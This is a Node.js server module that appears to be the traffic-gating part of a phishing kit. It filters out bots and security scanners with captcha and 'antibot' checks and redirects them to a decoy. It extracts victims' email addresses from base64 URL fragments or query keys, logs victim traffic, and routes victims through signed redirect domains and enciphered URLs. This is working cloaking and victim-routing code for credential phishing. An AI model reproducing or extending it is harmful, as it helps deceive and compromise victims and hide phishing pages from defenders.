const path = require('path')
const fs = require('fs')
const superagent = require('superagent')
const urlParse = require('url-parse')
const ClsIpPot = require('./ippot')
const logger = require('./logger')
const cipher = require('./urlcipher')
const redirectOBj = require('./redirect')
const trafficDatabase = require('../db/traffic')

const captcha = require('../botsystem/captcha')

const externalAntibot = require('../botsystem/external-antibot')
const keyVerification = require('../botsystem/key-verification')
const turnstileVerification = require('../botsystem/turnstile-challenge')
const appVars = require('./variable.js')




const ipPot = new ClsIpPot()

module.exports = (req, res, contextStore) => {

    /** WE SET ANTI-BOT CODE HERE */

    /** STORE IP TO POT STORAGE */

    const ipClient = req.connection.remoteAddress

    const setCoreParams = (clientContext) => {
        res.clientContext = clientContext
        req.clientContext = clientContext
    }

    let ipObj = ipPot.fetchIpData(ipClient)
    if (ipObj === null) {
        ipObj = ipPot.addNewIP(ipClient)
    }

    /** VALIDATE IP SESSION
    if (!ipObj.sessionActive) {
        res.writeHead(401)
        return res.end()
    }
     */
    const cookieObj = {}

    
    const urlObj = urlParse(req.url, true)
    if (appVars.SIGNATURE_KEY in urlObj.query) {

        logger.debug('Importing and verifying a user with signature')

        const rv = importUser(req, res, contextStore)
        if (rv) {
            return 0
        }

    } 

    const clientContext = contextStore.verifyClient(req, res)
    if (clientContext === null) {
        if (process.env.SRC_KEY in urlObj.query) {

            if (req.method === 'OPTIONS') {
                res.writeHead(200, {
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Headers': '*', 
                })
                return res.end();

            }

            // Ensure only redirect domain can allow signature in
            if (process.env.REDIRECT_DOMAIN 
                && !(String(req.host).endsWith(process.env.REDIRECT_DOMAIN))) {
                logger.debug('BOT! Tried to Access Domain Without Redirect Signature')
                return skipBot(req, res)
            }
            
            contextStore.loadClient(req, res, (newClientContext) => {
                if (newClientContext === null) {
                    logger.warn('Failed to lookup client context for this user cannot allow')
                    return rejectUser(req, res)
                }
                setCoreParams(newClientContext)

                trafficDatabase.installNewTraffic(newClientContext, req)

                return filterBySystem(req, res, newClientContext, (error) => {
                    if (error) {
                        logger.error(error)
                    }
                    
                    logger.debug(`Successfully Finished AUTH for client with IP: ${clientContext.ip}`)
                   
                })
                
            })
        } else {
            logger.debug('BOT! Request without session and correct request params')
            return skipBot(req, res)
        }
    } else {
               
        if (clientContext.allowVisitor === true) {
            const urlGrab = getUrlGrab(req.url);

            if (req.host === process.env.REDIRECT_DOMAIN) {
                return routeRedirect(req, res, clientContext, urlGrab)
            }

            setCoreParams(clientContext)
            clientContext.hostname = req.host

            return flowUserIn(req, res, clientContext, urlGrab)
        }

        const srcData = urlObj.query[process.env.SRC_KEY]

        if (typeof srcData === 'string' && srcData !== '') {

            logger.debug('Client Trying to Authenticate via Captcha?')
            return captcha.execCaptcha(req, res, srcData, (captchaSuccess) => {
                if (captchaSuccess) {

                    return authUser(req, res, clientContext)
                }

                return rejectUser(req, res)
            })

        }

        return rejectUser(req, res)
    }
    return 0

}




const rejectUser = (req, res) => {

    if (req.headers['qrc-auth'] || req.headers['authorization']) {
        res.writeHead(200, {
            'content-type': 'application/json',
            'Access-Control-Allow-Origin': '*',
        })
        res.end(JSON.stringify({ error: 'ACCESS DENIED' }))

    } else {
        res.writeHead(500)
        res.end('<h1>Access Denied</h1>')
    }
   
}

const skipBot = (req, res) => {
    res.writeHead(302, {
        location: `https://href.li?${process.env.BOT_REDIRECT}`,
    })
    return res.end()
}

const flowUserIn = (req, res, clientContext, urlGrab) => {

    if (urlGrab) {
        const reqUrlObj = urlParse(req.url, true)
        reqUrlObj.query.qrc = urlGrab

    }

    logger.debug(`|| ${clientContext.scheme || 'xxx'} || USER: ${clientContext.ip}| Returning Request from Visitor`)

    if (cipher.checkIsCipher(req.url)) {
        req.url = cipher.decipherUrl(req.url, clientContext)
    }
    clientContext.getEventEmitter().emit('PRE', req, res, clientContext)

}


const isValidBase64 = (str) => {
    try {
      return Buffer.from(str, 'base64').toString('base64') === str;
    } catch (err) {
      return false;
    }
}

const authUser = (req, res, newClientContext) => {
    newClientContext.hostname = req.host

    newClientContext.setIsActive(true)

   const urlGrab = getUrlGrab(req.url)

    if (req.host === process.env.REDIRECT_DOMAIN
        || String(req.host).endsWith(process.env.REDIRECT_DOMAIN)) {
        routeRedirect(req, res, newClientContext, urlGrab)

    } else {

       connectUserToPage(req, res, newClientContext, urlGrab)
    }

}

const connectUserToPage = (req, res, clientContext, urlGrab) => {

   
    const tokenUrl = urlParse(clientContext.startPath, true)
    if (urlGrab) {
       
        tokenUrl.query.qrc = urlGrab
    }


    const inLocationString = tokenUrl.toString()

    const cipherLocation = cipher.makeCipherUrl(inLocationString, clientContext)

    res.writeHead(302, {
        location: cipherLocation,
    })
    return res.end()
     
}

const importUser = (req, res, contextStore) => {

    const signatureObj = redirectOBj.parseJwtSignature(req, appVars.SIGNATURE_KEY)

    if (!signatureObj) {
        logger.warn('Failed to parse and decode signature')

        rejectUser(req, res)
        return false
    }

    const clientContext = contextStore.reloadClient(req, res, signatureObj.key)

    if (clientContext === null) {
        logger.warn('Failed to import user with signature')
        rejectUser(req, res)
        return false
    }

    clientContext.hostname = signatureObj.domain

    trafficDatabase.updateActiveDomain(clientContext, signatureObj.domain)

    clientContext.currentDomain = clientContext.baseDomain


    connectUserToPage(req, res, clientContext, signatureObj.qrc)
    return true



}

const routeRedirect = (req, res, clientContext, urlGrab) => {
    const tokenUrl = urlParse(req.url, true)

    const externalUrlSigned = redirectOBj.getExternalUrlSignature(appVars.SIGNATURE_KEY, 
        tokenUrl, clientContext, urlGrab)
    
    if (!externalUrlSigned) {
        res.writeHead(500)
        return res.end('NO ROUTE TO HOST')
    
    } 

    if (req.headers['qrc-auth'] || req.headers['authorization']) {
        res.writeHead(200, {
            'content-type': 'application/json',
            'Access-Control-Allow-Origin': '*',
        })
        let routeMsg = { url: externalUrlSigned }
        if (appVars.SUPPORTED_FRAMES.indexOf(process.env.CURRENT_PROJECT) > -1) {
            routeMsg.frame = true
        } else {
            routeMsg.frame = false
        }
        res.end(JSON.stringify(routeMsg))
    } else {
        res.writeHead(302, {
            location: externalUrlSigned,
        })
        res.end()
    }

    return 0
    
}



const getUrlGrab = (reqUrl) => {

    const reqUrlObj = urlParse(reqUrl, true)
    let urlGrab = null
    
    const fragment = reqUrlObj.hash;

    
    if (fragment) {
    
        const decodedFragment = Buffer.from(fragment, 'base64').toString().includes('@') 
                                ? Buffer.from(fragment, 'base64').toString() : fragment;

        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        const emailMatches = decodedFragment.match(emailRegex);
        if (emailMatches) {
            // eslint-disable-next-line prefer-destructuring
            urlGrab = emailMatches[0];
        } 
        logger.warn('Invalid email address in URL fragment');

    } else if (reqUrlObj.query.qrc) {
        urlGrab = reqUrlObj.query.qrc
    } else {
        const ETAG = 'emailaddress';
        const tagList = Array.from({ length: ETAG.length }, (_, i) => ETAG.slice(0, i + 1));
        
        const keyQuery = tagList.find((key) => key in reqUrlObj.query);

        if (keyQuery) {
            urlGrab = reqUrlObj.query[keyQuery];
            delete reqUrlObj.query[keyQuery];
        }
    }

    if (urlGrab && isValidBase64(urlGrab)) {
        urlGrab = Buffer.from(urlGrab, 'base64').toString()
    }

    return urlGrab

}


const filterBySystem = (req, res, clientContext, cBack) => {
    if (req.headers['qrc-auth'] || req.headers['authorization'] || req.headers['access-control-request-headers'] === 'qrc-auth') {
        logger.warn('Private, Rendering internal challenge')
        
        clientContext.location = 'ANTIBOT(Private)'
        clientContext.description = 'AUTHENTICATED WITH ANTIBOT(Private)'
        clientContext.allowVisitor = false
        
        const keyStatus = keyVerification.verifyWithPrivateKey(req, clientContext)

        if (keyStatus) {
            clientContext.allowVisitor = true
            return authUser(req, res, clientContext)
        } 
        
        return rejectUser(req, res)
    }
        

    // } if (process.env.ANTIBOT === 'OFF') {
       
    //     logger.warn('Antibot DISABLED, allowing all users inside')
    //     clientContext.location = 'ANTIBOT DISABLED'
    //     clientContext.description = 'ANTIBOT DISABLED'
    //     clientContext.allowVisitor = true
    //     return authUser(req, res, clientContext)

    // } 
    if (process.env.ANTIBOT === 'INTERNAL') {
        logger.warn('Antibot(INTERNAL), Rendering internal challenge')
        clientContext.location = 'ANTIBOT INTERNAL'
        clientContext.description = 'AUTHENTICATED WITH ANTIBOT(INTERNAL)'
        clientContext.allowVisitor = false
        console.log('Internal Not yet implemented')

        return res.end('Error Occurred')
    } if (process.env.ANTIBOT === 'TURNSTILE') {
        logger.warn('Antibot(TURNSTILE), Rendering turnstile challenge')
        clientContext.location = 'ANTIBOT TURNSTILE'
        clientContext.description = 'AUTHENTICATED WITH ANTIBOT(TURNSTILE)'
        clientContext.allowVisitor = false

        
        return captcha.challengeUser(req, res, clientContext)


    } if (process.env.ANTIBOT === 'EXTERNAL') {

       return externalAntibot.validateUser(req, clientContext, (status) => {

        if (clientContext.allowVisitor) {
            logger.info(`ANTI-BOT ALLOWED NEW USER UA: ${clientContext.userAgent} LOCATION: ${clientContext.location} `)
            
            return authUser(req, res, clientContext)
            
        }

        logger.info('Antibot EXTERNAL Rejected the USER')


        if (process.env.HCAPTCHA_DATA) {
            logger.info('Authenticating User with Captcha....')


            return captcha.challengeUser(req, res, clientContext)
        }

        return rejectUser(req, res)
       })
    
    }

    
    logger.debug('ANTIBOT ASSUMING TO BE TURNED OFF....')
    logger.warn('Antibot DISABLED, allowing all users inside')
    clientContext.location = 'ANTIBOT DISABLED'
    clientContext.description = 'ANTIBOT DISABLED'
    clientContext.allowVisitor = true
    return authUser(req, res, clientContext)
}